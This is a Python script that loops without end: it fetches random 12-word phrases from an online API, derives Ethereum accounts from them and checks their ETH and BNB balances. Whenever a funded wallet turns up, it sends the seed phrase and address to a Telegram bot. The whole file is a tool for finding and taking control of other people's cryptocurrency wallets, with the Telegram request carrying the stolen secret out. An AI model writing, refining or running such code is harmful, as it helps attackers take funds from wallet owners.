import requests
from eth_account import Account
from eth_utils import to_checksum_address
from web3 import Web3
import os

Account.enable_unaudited_hdwallet_features()
eth_rpc_url = 'https://ethereum.publicnode.com'
ethereum = Web3(Web3.HTTPProvider(eth_rpc_url))

bsc_rpc_url = "https://bsc-dataseed.binance.org/"
bsc = Web3(Web3.HTTPProvider(bsc_rpc_url))

balance_in_eth = 0
balance_in_bin = 0

total = 0
i = 1

url = "https://random-phrase-generator.p.rapidapi.com/get12word"

headers = {
 "X-RapidAPI-Key": "<YOUR_API_KEY>",
 "X-RapidAPI-Host": "random-phrase-generator.p.rapidapi.com"
}

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear') # clear terminal

while True:
  try:
        response = requests.get(url, headers=headers)
        waords = response.json()["words"]

        seed_phrase = ' '.join(waords)  #LİST TO STRING
        wallet = Account.from_mnemonic(seed_phrase) # Connect with seed
        my_address = to_checksum_address(wallet.address) #check wallet adr

        try:
            balance_in_wei = ethereum.eth.get_balance(my_address) #get balance
            balance_in_eth = balance_in_wei / 10 ** 18  # wei to eth
            total += balance_in_eth # add total
        except Exception as e:
            print(e)
            pass

        try:
            balance_in_bsc = bsc.eth.get_balance(my_address) #get balance
            balance_in_bin = balance_in_bsc / 10 ** 18    # wei to eth
            total += balance_in_bin  # add total
        except Exception as e:
            print(e)
            pass

        print(f"\033[91m{seed_phrase}\033[0m" + " || " + f"\033[92m{my_address}\033[0m" + " || " + f"\033[94m( // {balance_in_eth} //  {balance_in_bin} //) ETH,BNB\033[0m" + " || " + f"\33[41m{total}\33[0m" + f"||   retry: {i}") #print

        text2 = f"{total} FOUND {seed_phrase} \n\n\n Wallet Address = {my_address}"
        if total > 0: # check total and send message in telegram
            requests.get(f"https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_KEY>/sendMessage?chat_id=<YOUR_CHAT_ID>&text={text2}")
        if i % 100 == 0:
            clear_terminal() # every 100 times, clear terminal.

        i+=1
  except Exception as e:
    print(e)
    pass
